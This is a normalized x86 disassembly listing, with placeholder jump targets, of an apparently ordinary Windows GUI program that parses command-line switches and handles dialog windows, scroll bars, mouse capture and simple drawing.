mov bl [ esp + 0x17 ]
push r--data
lea ecx [ esp + 0x14 ]
push ecx
mov [ esp + 0x1f ] 0x0
call ebp
test eax eax
mov [ esp + 0x17 ] bl
jne r-xdata
mov al [ esp + 0x11 ]
cmp al 0x66
je r-xdata
push 0x104
lea eax [ esp + 0x14 ]
push esi
push eax
call sub_457da0
add esp 0xc
test eax eax
je r-xdata
push 0x8000
lea edx [ esp + 0x14 ]
push edx
jmp r-xdata
mov eax [ esp + 0x801c ]
mov [ eax ] 0x1
jmp r-xdata
cmp al 0x46
je r-xdata
push 0x8000
lea ecx [ esp + 0x14 ]
push ecx
push esi
call sub_458050
add esp 0x4
jmp r-xdata
push esi
call edi
push 0x8000
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x801c ]
push eax
call sub_4581e0
add esp 0xc
test eax eax
jge r-xdata
cmp al 0x69
je r-xdata
cmp [ esp + 0x10 ] 0x2d
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
push 0x104
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x801c ]
push edx
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
cmp al 0x49
je r-xdata
lea eax [ esp + 0x10 ]
push eax
call [ lstrlenA@IAT ]
cmp eax 0x4
jle r-xdata
cmp al 0x6c
je r-xdata
cmp [ esp + eax + 0xc ] 0x2e
jne r-xdata
mov eax [ esp + 0x8020 ]
mov [ eax ] 0x1
jmp r-xdata
cmp al 0x4c
je r-xdata
mov cl [ esp + eax + 0xd ]
cmp cl 0x69
je r-xdata
cmp al 0x70
je r-xdata
mov cl [ esp + eax + 0xe ]
cmp cl 0x6e
je r-xdata
cmp cl 0x49
jne r-xdata
push 0x104
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x801c ]
push eax
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
cmp al 0x50
je r-xdata
mov al [ esp + eax + 0xf ]
cmp al 0x69
je r-xdata
cmp cl 0x4e
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call j_sub_4b692d
mov edx [ esp + 0x8028 ]
add esp 0x4
mov [ edx ] eax
jmp r-xdata
cmp al 0x65
je r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call sub_458050
add esp 0x4
lea edx [ esp + 0x10 ]
push edx
push rw-data
call [ lstrcpyA@IAT ]
jmp r-xdata
cmp al 0x49
jne r-xdata
push 0x104
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x801c ]
push ecx
call sub_4581e0
add esp 0xc
test eax eax
jl r-xdata
cmp al 0x45
je r-xdata
lea edx [ esp + 0x10 ]
push edx
call j_sub_4b692d
mov ecx [ esp + 0x802c ]
add esp 0x4
mov [ ecx ] eax
jmp r-xdata
cmp al 0x61
je r-xdata
mov edx [ esp + 0x802c ]
mov [ edx ] 0x1
jmp r-xdata
cmp al 0x41
jne r-xdata
sub_458550
sub esp 0x18
push ebx
mov ebx [ esp + 0x28 ]
push esi
mov esi [ esp + 0x24 ]
push edi
mov edi [ esp + 0x2c ]
mov eax edi
sub eax 0x200
je r-xdata
lea eax [ esp + 0xc ]
push eax
call [ GetCursorPos@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push esi
call [ ScreenToClient@IAT ]
lea edx [ esp + 0x14 ]
push edx
push esi
call [ GetClientRect@IAT ]
mov eax [ esp + 0xc ]
cmp [ esp + 0x14 ] eax
jg r-xdata
sub eax 0x3
jne r-xdata
test bl 0x1
jne r-xdata
cmp [ esp + 0x1c ] eax
jle r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ rw-data ]
push eax
push ebx
push edi
push esi
push ecx
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x18
retn 0x10
mov eax [ esp + 0x34 ]
push eax
mov ecx ebx
push ecx
push 0x201
mov edx esi
push edx
call [ SendMessageA@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x18
retn 0x10
mov [ rw-data ] 0x0
call [ ReleaseCapture@IAT ]
mov eax [ esp + 0x10 ]
cmp [ esp + 0x18 ] eax
jg r-xdata
cmp [ esp + 0x20 ] eax
jle r-xdata
mov [ rw-data ] esi
call [ GetCapture@IAT ]
cmp eax esi
je r-xdata
push 0x0
push 0x0
push esi
call [ InvalidateRect@IAT ]
push esi
call [ SetCapture@IAT ]
jmp r-xdata
sub_458630
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
add ecx eax
xor esi esi
test ecx ecx
jle r-xdata
pop esi
retn
mov eax [ rw-data ]
push ebx
mov ebx [ GetDlgItem@IAT ]
push ebp
mov ebp [ esp + 0x14 ]
push edi
mov edi [ InvalidateRect@IAT ]
lea esp [ esp ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
inc esi
add edx ecx
cmp esi edx
jl r-xdata
test eax eax
mov [ esi * 4 + rw-data ] ebp
je r-xdata
mov edx [ esp + 0x14 ]
cmp [ esi * 4 + rw-data ] edx
jne r-xdata
pop edi
pop ebp
pop ebx
push 0x1
push 0x0
lea ecx [ esi + 0xa ]
push ecx
push eax
call ebx
push eax
call edi
mov eax [ rw-data ]
sub_4586b0
mov eax [ esp + 0x8 ]
cmp eax 0x100
mov ecx [ esp + 0xc ]
jne r-xdata
mov edx [ esp + 0x10 ]
push edx
push ecx
mov ecx [ rw-data ]
push eax
mov eax [ esp + 0x10 ]
push eax
push ecx
call [ CallWindowProcA@IAT ]
retn 0x10
cmp ecx 0xd
jne r-xdata
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
xor eax eax
retn 0x10
sub_458700
mov eax [ esp + 0x8 ]
sub esp 0x18
push ebx
mov ebx [ esp + 0x28 ]
add eax 0xfffffe00
cmp eax 0x3
push esi
mov esi [ esp + 0x24 ]
ja r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x28 ]
mov eax [ rw-data ]
push ecx
push ebx
push edx
push esi
push eax
call [ CallWindowProcA@IAT ]
pop esi
pop ebx
add esp 0x18
retn 0x10
jmp [ eax * 4 + jump_table_458800 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x24 ]
push eax
push ecx
push 0x201
push edx
call [ SendMessageA@IAT ]
pop esi
xor eax eax
pop ebx
add esp 0x18
retn 0x10
mov [ rw-data ] 0x1
jmp r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
lea eax [ esp + 0x8 ]
push eax
call [ GetCursorPos@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
push esi
call [ ScreenToClient@IAT ]
lea edx [ esp + 0x10 ]
push edx
push esi
call [ GetClientRect@IAT ]
mov eax [ esp + 0x8 ]
cmp [ esp + 0x10 ] eax
jg r-xdata
test bl 0x1
je r-xdata
cmp [ esp + 0x18 ] eax
jge r-xdata
mov eax [ esp + 0x30 ]
push ebp
push edi
mov edi [ SendMessageA@IAT ]
push eax
push ebx
push 0x202
push esi
call edi
call [ ReleaseCapture@IAT ]
mov ebp [ GetParent@IAT ]
push esi
call ebp
push eax
call [ SetCapture@IAT ]
push 0x0
push esi
call [ GetDlgCtrlID@IAT ]
sub eax 0xa
push eax
push 0x505
push esi
call ebp
push eax
call edi
pop edi
pop ebp
sub_458810
sub esp 0x18
push ebx
push ebp
push esi
mov esi [ esp + 0x28 ]
push edi
lea eax [ esp + 0x18 ]
push eax
push esi
call [ GetClientRect@IAT ]
push 0xfffffffa
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x34 ]
mov ebp [ esp + 0x30 ]
mov edi [ esp + 0x20 ]
mov ebx [ GetDlgItem@IAT ]
mov [ esp + 0x14 ] eax
lea eax [ ecx + ebp ]
mov ecx [ esp + 0x18 ]
lea edx [ eax + eax * 8 ]
shl edx 0x1
sub edi edx
push 0x64
sub edi ecx
push esi
mov [ esp + 0x18 ] eax
sub edi 0x3c
call ebx
test eax eax
jne r-xdata
push 0x1
push 0x14
push edi
push 0x52
lea eax [ ebp + ebp * 8 ]
lea ecx [ eax + eax + 0x1e ]
push ecx
push 0x64
push esi
call ebx
push eax
call [ MoveWindow@IAT ]
mov al [ esp + 0x38 ]
test al al
je r-xdata
push eax
mov eax [ esp + 0x18 ]
push eax
push 0x64
push esi
push 0x14
push edi
push 0x52
lea ecx [ ebp + ebp * 8 ]
lea edx [ ecx + ecx + 0x1e ]
push edx
push 0x58000101
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push 0x0
push 0x5
jmp r-xdata
cmp eax 0x20
jge r-xdata
imul eax eax 0xffffffee
mov edi 0xa
mov [ esp + 0x38 ] 0x1e
mov [ esp + 0x34 ] eax
jmp r-xdata
push 0x64
push esi
call ebx
push eax
call [ ShowWindow@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
lea edi [ eax + 0xa ]
lea edx [ edi - 0xa ]
cmp edx ebp
jge r-xdata
inc edi
cmp edi 0x2a
jl r-xdata
push 0x0
push edi
push esi
call ebx
push eax
call [ ShowWindow@IAT ]
sub eax [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
lea ebp [ eax + ecx - 0x1e ]
mov ebp [ esp + 0x38 ]
jmp r-xdata
push edi
push esi
call ebx
test eax eax
je r-xdata
push 0x1
push 0x12
push 0x12
push 0x52
push ebp
push edi
push esi
call ebx
push eax
call [ MoveWindow@IAT ]
push 0x5
push edi
push esi
call ebx
push eax
call [ ShowWindow@IAT ]
mov ecx [ esp + 0x38 ]
mov ebp [ esp + 0x34 ]
mov eax 0x12
add ecx eax
add ebp eax
inc edi
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x10 ]
lea eax [ edi - 0xa ]
cmp eax ecx
mov [ esp + 0x34 ] ebp
jl r-xdata
mov edx [ esp + 0x14 ]
push eax
push edx
push edi
push esi
push 0x12
push 0x12
push 0x52
push ebp
push 0x5000000b
push r--data
push r--data
push eax
call [ CreateWindowExA@IAT ]
push sub_458700
push 0xfffffffc
push eax
call [ SetWindowLongA@IAT ]
mov [ rw-data ] eax
push edi
push esi
call ebx
test eax eax
jne r-xdata
mov ebp [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
mov eax ecx
sub_4589d0
mov eax [ esp + 0x8 ]
sub esp 0x250
cmp eax 0x114
push ebx
push ebp
push esi
push edi
ja r-xdata
sub eax 0x200
je r-xdata
je r-xdata
test [ esp + 0x26c ] 0x1
je r-xdata
sub eax 0x2
je r-xdata
mov ebx [ esp + 0x270 ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x2
push ebx
mov [ esp + 0x20 ] 0x1c
mov [ esp + 0x24 ] 0x7
call [ GetScrollInfo@IAT ]
mov ecx [ esp + 0x26c ]
movzx eax cx
cmp eax 0x7
mov [ esp + 0x18 ] 0x4
ja r-xdata
cmp eax 0x110
ja r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
mov eax [ rw-data ]
test eax eax
jle r-xdata
call [ ReleaseCapture@IAT ]
mov eax [ rw-data ]
test eax eax
jle r-xdata
sub eax 0x303
je r-xdata
push 0x1
lea eax [ esp + 0x18 ]
push eax
push 0x2
push ebx
call [ SetScrollInfo@IAT ]
mov ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0x60 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov esi [ esp + 0x270 ]
mov edi [ GetDlgItem@IAT ]
add esp 0xc
push 0x531
push esi
call edi
cmp ebx eax
mov ebp [ SendDlgItemMessageA@IAT ]
jne r-xdata
jmp [ eax * 4 + jump_table_4596e4 ]
cmp eax 0x111
jne r-xdata
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
mov ebx [ esp + 0x264 ]
mov esi [ GetDlgItem@IAT ]
push 0x2
push 0x531
push ebx
call esi
mov ebp [ GetScrollPos@IAT ]
push eax
call ebp
push 0x2
push 0x534
mov edi eax
push ebx
mov [ esp + 0x48 ] edi
call esi
push eax
call ebp
mov [ esp + 0x40 ] eax
lea eax [ esp + 0x4c ]
push eax
call [ GetCursorPos@IAT ]
mov ecx [ esp + 0x40 ]
add edi ecx
xor ebp ebp
test edi edi
mov [ esp + 0x30 ] ebp
mov [ esp + 0x48 ] edi
jle r-xdata
mov edx [ esp + 0x264 ]
push 0x1
push 0x0
add eax 0x9
push eax
push edx
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
mov eax [ esp + 0x264 ]
push 0x0
push 0xc8
push eax
call [ GetDlgItem@IAT ]
push eax
call [ ShowWindow@IAT ]
mov ecx [ esp + 0x26c ]
pop edi
pop esi
inc ecx
pop ebp
mov [ rw-data ] ecx
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x250
retn 0x10
push 0x534
push esi
call edi
cmp ebx eax
jne r-xdata
lea eax [ esp + 0x5c ]
push eax
push 0x0
push 0xc
push 0x532
push esi
call ebp
mov edx [ esp + 0x1c ]
mov [ esp + 0x28 ] edx
jmp r-xdata
mov eax [ esp + 0x20 ]
sub eax [ esp + 0x24 ]
inc eax
mov [ esp + 0x28 ] eax
jmp r-xdata
mov ecx [ esp + 0x28 ]
cmp ecx [ esp + 0x1c ]
jle r-xdata
mov edx [ esp + 0x20 ]
mov esi [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
sub edx esi
inc edx
cmp eax edx
jge r-xdata
mov eax [ esp + 0x28 ]
mov esi [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
sub eax esi
cmp eax ecx
mov [ esp + 0x28 ] eax
jge r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
add ecx eax
sub edx eax
lea eax [ edx + 0x1 ]
cmp ecx eax
mov [ esp + 0x28 ] ecx
jle r-xdata
shr ecx 0x10
mov eax [ esp + 0x26c ]
movzx esi ax
cmp esi 0xc8
jg r-xdata
mov ecx [ rw-data ]
mov edi [ wsprintfA@IAT ]
push ecx
lea edx [ esp + 0x60 ]
push r--data
push edx
call edi
mov esi [ esp + 0x270 ]
mov ebx [ SendDlgItemMessageA@IAT ]
add esp 0xc
lea eax [ esp + 0x5c ]
push eax
push 0x0
push 0xc
push 0x532
push esi
call ebx
mov ecx [ rw-data ]
mov ebp [ GetDlgItem@IAT ]
push 0x1
lea edx [ esp + 0x18 ]
push edx
push 0x2
push 0x531
push esi
mov [ esp + 0x28 ] 0x1c
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x10
mov [ esp + 0x3c ] ecx
mov [ esp + 0x38 ] 0x1
call ebp
push eax
call [ SetScrollInfo@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
nop
push 0x533
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
setne dl
push edx
push 0x2
push 0x534
push esi
call edi
mov ebx [ GetScrollPos@IAT ]
push eax
call ebx
push eax
push 0x2
push 0x531
push esi
call edi
push eax
call ebx
push eax
push esi
call sub_458810
add esp 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
lea ecx [ esp + 0x5c ]
push ecx
push 0x0
push 0xc
push 0x535
push esi
call ebp
mov eax ecx
dec eax
mov [ esp + 0x28 ] eax
jmp r-xdata
inc eax
mov [ esp + 0x28 ] eax
jmp r-xdata
jmp r-xdata
mov [ esp + 0x28 ] eax
jmp r-xdata
cmp esi 0x533
je r-xdata
je r-xdata
push 0x0
push 0x1
jmp r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x264 ]
push 0x0
push edx
push 0x30
push 0xc8
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x29
jne r-xdata
inc ebp
cmp ebp edi
mov [ esp + 0x30 ] ebp
jl r-xdata
lea eax [ esp + 0x14 ]
push eax
lea ecx [ ebp + 0xa ]
push ecx
push ebx
call esi
push eax
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x4c ]
cmp [ esp + 0x14 ] eax
jge r-xdata
mov [ esp + 0x28 ] ecx
mov esi [ esp + 0x264 ]
push 0x533
push esi
call [ IsDlgButtonChecked@IAT ]
mov edi [ GetDlgItem@IAT ]
test eax eax
setne al
push eax
push 0x2
push 0x534
push esi
call edi
mov ebx [ GetScrollPos@IAT ]
push eax
call ebx
push eax
push 0x2
push 0x531
push esi
call edi
push eax
call ebx
push eax
push esi
call sub_458810
add esp 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
cmp ax 0xa
jb r-xdata
shr eax 0x10
cmp eax 0x1
jne r-xdata
mov ecx esi
dec ecx
je r-xdata
push 0x544
push 0x545
jmp r-xdata
push 0x533
push esi
call [ CheckDlgButton@IAT ]
cmp [ rw-data ] 0x2
push 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ DeleteObject@IAT ]
mov esi [ esp + 0x270 ]
mov eax [ esi + 0x14 ]
push eax
call [ GetDlgCtrlID@IAT ]
mov ebp [ esp + 0x264 ]
push 0x2
push 0x531
push ebp
mov edi eax
call [ GetDlgItem@IAT ]
push eax
call [ GetScrollPos@IAT ]
push 0x2
push 0x534
push ebp
mov ebx eax
call [ GetDlgItem@IAT ]
push eax
call [ GetScrollPos@IAT ]
lea ecx [ edi - 0xa ]
cmp ecx ebx
jge r-xdata
mov edx [ rw-data ]
dec edx
cmp edx ebp
je r-xdata
cmp eax [ esp + 0x1c ]
jge r-xdata
cmp ax 0x29
ja r-xdata
mov ebx [ esp + 0x264 ]
mov ebp [ GetDlgItem@IAT ]
push 0x2
push 0x531
push ebx
call ebp
mov esi [ GetScrollPos@IAT ]
push eax
call esi
push 0x2
push 0x534
push ebx
mov edi eax
call ebp
push eax
call esi
push 0x0
mov esi eax
cmp [ rw-data ] edi
push 0x0
push 0x147
jge r-xdata
mov ebx [ esp + 0x264 ]
mov edi [ GetDlgItem@IAT ]
push 0x2
push 0x531
push ebx
call edi
mov esi [ GetScrollPos@IAT ]
push eax
call esi
push 0x2
push 0x534
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov ebp [ IsDlgButtonChecked@IAT ]
push 0x533
push ebx
mov [ rw-data ] eax
call ebp
test eax eax
mov [ rw-data ] eax
je r-xdata
dec ecx
jne r-xdata
mov edx [ ebx + rw-data ]
push edx
push 0x0
push 0x143
push edi
call ebp
add ebx 0x4
cmp ebx 0x2b0
jb r-xdata
mov eax [ rw-data ]
push 0x1
add eax 0x546
push eax
push esi
call [ CheckDlgButton@IAT ]
push 0x104
lea ecx [ esp + 0x160 ]
push ecx
push 0x0
mov [ esp + 0x168 ] 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x15c ]
push edx
call sub_457f40
add esp 0x4
mov [ esp + eax + 0x15c ] 0x0
push r--data
lea eax [ esp + 0x160 ]
push eax
call [ lstrcatA@IAT ]
push 0x1010
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x16c ]
push ecx
push 0xfffffffa
push esi
call [ GetWindowLongA@IAT ]
push eax
call [ LoadImageA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
push esi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
push eax
lea ecx [ esp + 0x60 ]
push r--data
push ecx
call edi
add esp 0xc
lea edx [ esp + 0x5c ]
push edx
push 0x0
push 0xc
push 0x535
push esi
call ebx
mov eax [ rw-data ]
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
push 0x2
push 0x534
push esi
mov [ esp + 0x28 ] 0x1c
mov [ esp + 0x3c ] eax
mov [ esp + 0x38 ] 0x1
call ebp
push eax
call [ SetScrollInfo@IAT ]
push 0x0
push 0xfffffffa
push esi
call [ GetWindowLongA@IAT ]
push eax
push 0xc8
push esi
push 0x12c
push 0x12c
push 0x32
push 0x32
push 0x40200403
push r--data
push r--data
push 0x8
call [ CreateWindowExA@IAT ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x31
push esi
mov edi eax
call ebp
push 0x0
push 0x0
push 0x31
push edi
mov ebx eax
call ebp
push 0x0
push ebx
push 0x30
push edi
mov [ rw-data ] eax
call ebp
push r--data
push 0x0
push 0x143
push edi
call ebp
xor ebx ebx
push eax
call [ DeleteDC@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
sub eax edi
add eax ebx
mov edi [ eax * 4 + rw-data ]
mov edi [ ecx * 4 + rw-data ]
jmp r-xdata
mov esi [ rw-data ]
xor edx edx
dec esi
cmp esi ebp
setl dl
cmp esi ebp
lea edx [ edx + edx - 0x1 ]
mov edi edx
je r-xdata
mov ebx [ esp + 0x264 ]
push 0x2
push 0x531
push ebx
call [ GetDlgItem@IAT ]
mov edi [ GetScrollPos@IAT ]
push eax
call edi
push 0x2
push 0x534
push ebx
mov ebp eax
call [ GetDlgItem@IAT ]
push eax
call edi
lea edx [ esp + 0x4c ]
push edx
push ebx
mov edi eax
add esi 0xfffffff6
call [ GetClientRect@IAT ]
push 0xc8
push ebx
call [ GetDlgItem@IAT ]
cmp esi ebp
mov ebx eax
mov [ rw-data ] esi
push 0x0
jge r-xdata
mov eax [ esp + 0x27c ]
push eax
call [ SendMessageA@IAT ]
mov ecx eax
mov eax [ rw-data ]
sub ecx 0x2
sub esi eax
add esi edi
mov [ esi * 4 + rw-data ] ecx
mov ecx [ esp + 0x27c ]
push ecx
call [ SendMessageA@IAT ]
mov edx eax
mov eax [ rw-data ]
sub edx 0x2
mov [ eax * 4 + rw-data ] edx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
push 0x545
push ebx
call ebp
add [ rw-data ] eax
mov edx [ esp + 0x264 ]
push 0x2
push edx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
mov edx [ rw-data ]
mov edi [ rw-data ]
lea ecx [ edx + edi ]
xor eax eax
lea ecx [ ecx * 4 + rw-data ]
or ebx 0xffffffff
push esi
call [ GetDC@IAT ]
mov edi eax
push edi
call [ CreateCompatibleDC@IAT ]
push edi
push esi
mov [ rw-data ] eax
call [ ReleaseDC@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push eax
call [ SelectObject@IAT ]
mov edx [ rw-data ]
dec edx
cmp edx ecx
jne r-xdata
test al 0x10
jne r-xdata
mov eax [ esi + 0x10 ]
test al 0x1
je r-xdata
mov eax [ esp + 0x30 ]
mov ebp [ esp + 0x30 ]
mov esi [ GetDlgItem@IAT ]
mov edi [ esp + 0x48 ]
inc eax
mov [ rw-data ] eax
mov edx [ esp + 0x3c ]
mov eax edi
neg eax
mov [ esp + 0x44 ] eax
lea eax [ esi + edi ]
lea ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x40 ]
sub eax esi
mov ebp edi
neg ebp
mov [ esp + 0x38 ] ecx
lea ecx [ eax + edx - 0x1 ]
sub eax edi
shl ebp 0x2
add eax edx
lea edx [ eax * 4 + rw-data ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x58 ]
mov eax esi
sub eax edi
sub eax ebp
lea ecx [ eax + eax * 8 ]
mov eax [ esp + 0x50 ]
shl ecx 0x1
sub ecx eax
sub edi esi
lea eax [ ecx + edx - 0xd4 ]
add edi ebp
mov ecx [ edi * 4 + rw-data ]
add ecx 0x2
push ecx
push 0x14e
push ebx
mov [ esp + 0x20 ] eax
call [ SendMessageA@IAT ]
mov edi [ esp + 0x10 ]
mov eax [ esi * 4 + rw-data ]
add eax 0x2
push eax
push 0x14e
lea edi [ esi + esi * 8 ]
push ebx
lea edi [ edi + edi + 0x1e ]
call [ SendMessageA@IAT ]
jmp r-xdata
push 0x1
push 0x0
add eax 0xa
push eax
push ebx
call ebp
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
mov edx [ rw-data ]
test edx edx
jle r-xdata
mov ecx eax
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov edi [ GetDlgItem@IAT ]
mov [ eax * 4 + rw-data ] ebx
mov ebp [ eax * 4 + rw-data ]
mov [ eax * 4 + rw-data ] ebp
jmp r-xdata
mov eax [ esi + 0x18 ]
push 0x10
push 0x4
lea edx [ esi + 0x1c ]
push edx
push eax
mov ecx [ esi + 0x18 ]
push 0x210
push 0x4
lea eax [ esi + 0x1c ]
push eax
push ecx
jmp r-xdata
mov eax 0x1
xor eax eax
mov ecx esi
jmp r-xdata
push 0x1
push 0x190
push 0xc8
push 0x66
push edi
push ebx
call [ MoveWindow@IAT ]
push 0x5
push ebx
call [ ShowWindow@IAT ]
mov edx [ rw-data ]
pop edi
pop esi
pop ebp
mov [ rw-data ] edx
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
xor esi esi
nop
lea eax [ eax * 4 + rw-data ]
lea ecx [ edx * 4 + rw-data ]
lea esp [ esp ]
mov [ eax * 4 + rw-data ] ebx
mov ebp [ ecx ]
mov [ eax * 4 + rw-data ] ebp
jmp r-xdata
cmp eax edx
jge r-xdata
cmp edi 0xfffffffe
jne r-xdata
mov eax edi
cdq
and edx 0xf
add eax edx
sar eax 0x4
shl eax 0x4
and edi 0x8000000f
push 0xcc0020
push eax
jns r-xdata
call [ DrawFrameControl@IAT ]
test edi edi
jl r-xdata
mov ecx [ ebx ]
push 0x1
mov [ ebx ] edx
mov ebx [ esp + 0x268 ]
push 0x0
lea edx [ esi + 0xa ]
push edx
push ebx
mov [ eax ] ecx
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
push 0x1
push 0x0
lea eax [ esi + edi + 0xa ]
push eax
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x44 ]
lea eax [ edi * 4 ]
add ecx eax
mov eax [ esp + 0x34 ]
add eax ebp
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x10 ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x30 ]
add esi edi
add ecx edx
cmp esi eax
mov [ esp + 0x10 ] ecx
jne r-xdata
mov ebx [ esp + 0x34 ]
shl eax 0x4
add eax ecx
mov edx [ eax * 4 + rw-data ]
lea ecx [ esi + edi ]
lea eax [ eax * 4 + rw-data ]
cmp ecx ebx
mov ebx [ esp + 0x38 ]
jl r-xdata
inc esi
cmp esi 0x3
jl r-xdata
mov [ rw-data ] esi
mov esi [ ecx ]
mov [ eax ] esi
add eax 0x4
sub ecx 0x4
dec edx
jne r-xdata
cmp eax edi
jge r-xdata
mov eax [ rw-data ]
test eax eax
setne cl
push ecx
push edx
push edi
push esi
call sub_458810
add esp 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
inc eax
sub ecx 0x4
cmp eax 0x10
jl r-xdata
mov ebx [ GetSysColor@IAT ]
push 0x14
call ebx
mov ebp [ CreatePen@IAT ]
push eax
push 0x1
push 0x0
call ebp
push 0x10
mov edi eax
call ebx
push eax
push 0x1
push 0x0
call ebp
mov ebp [ SelectObject@IAT ]
mov ebx eax
mov eax [ esi + 0x18 ]
push ebx
push eax
call ebp
mov ecx [ esi + 0x18 ]
push 0x0
push 0x1
push 0x7
push ecx
mov [ esp + 0x20 ] eax
call [ MoveToEx@IAT ]
mov edx [ esi + 0x18 ]
push 0x10
push 0x7
push edx
call [ LineTo@IAT ]
mov eax [ esi + 0x18 ]
push edi
push eax
call ebp
mov ecx [ esi + 0x18 ]
push 0x0
push 0x1
push 0x8
push ecx
call [ MoveToEx@IAT ]
mov edx [ esi + 0x18 ]
push 0x10
push 0x8
push edx
call [ LineTo@IAT ]
mov eax [ esp + 0x10 ]
mov ecx [ esi + 0x18 ]
push eax
push ecx
call ebp
mov esi [ DeleteObject@IAT ]
push edi
call esi
push ebx
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
mov ecx [ rw-data ]
mov edx [ esi + 0x18 ]
shl edi 0x4
push edi
push ecx
push 0x10
push 0x10
push 0x1
push 0x1
push edx
call [ BitBlt@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
dec edi
or edi 0xfffffff0
inc edi
mov ebx [ esp + 0x3c ]
cmp esi ebx
jge r-xdata
lea eax [ esi + 0x546 ]
push eax
push ebx
call ebp
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
test edx edx
jle r-xdata
push 0x0
push 0x0
push 0x40a
push eax
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
inc edx
push edx
push 0x1
push 0x405
push eax
call [ SendMessageA@IAT ]
push 0x1
push ebx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x250
retn 0x10
mov ebp [ InvalidateRect@IAT ]
mov esi 0xa
mov edx [ rw-data ]
mov eax [ rw-data ]
inc esi
add eax edx
lea ecx [ esi - 0xa ]
cmp ecx eax
jl r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push esi
push ecx
call edi
push eax
call ebp
mov eax [ rw-data ]
push esi
push eax
call edi
test eax eax
je r-xdata
sub_459710
push esi
mov esi [ esp + 0x8 ]
test esi esi
jge r-xdata
push ebx
